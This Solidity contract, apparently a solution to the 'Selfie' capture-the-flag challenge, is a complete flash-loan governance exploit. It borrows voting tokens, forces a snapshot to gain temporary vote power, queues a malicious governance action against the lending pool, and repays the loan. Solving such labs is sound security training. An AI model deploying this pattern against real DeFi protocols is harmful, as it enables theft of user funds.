// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IGov {
    function queueAction(address receiver, bytes memory data, uint256 weiAmount) external;
}

interface IToken is IERC20 {
    function snapshot() external;
}

contract SelfieAttacker{
    address public immutable flashloanerPool;
    address public immutable gov; 
    address public immutable owner;
    bytes public data;

    constructor(address _flashloanerPool, address _gov, bytes memory _data){
        flashloanerPool = _flashloanerPool;
        gov = _gov;
        data = _data;
        owner = msg.sender;
    }

    function receiveTokens(IToken token, uint amount) external{
        //force snapshot to get enough vote power
        token.snapshot();
        IGov(gov).queueAction(flashloanerPool, data, 0);
        //payback
        token.transfer(flashloanerPool, amount);
    }

    function attack(uint amount) external{
        require(msg.sender == owner, "!owner");
        IFlashLoanerPool(flashloanerPool).flashLoan(amount);
    }

}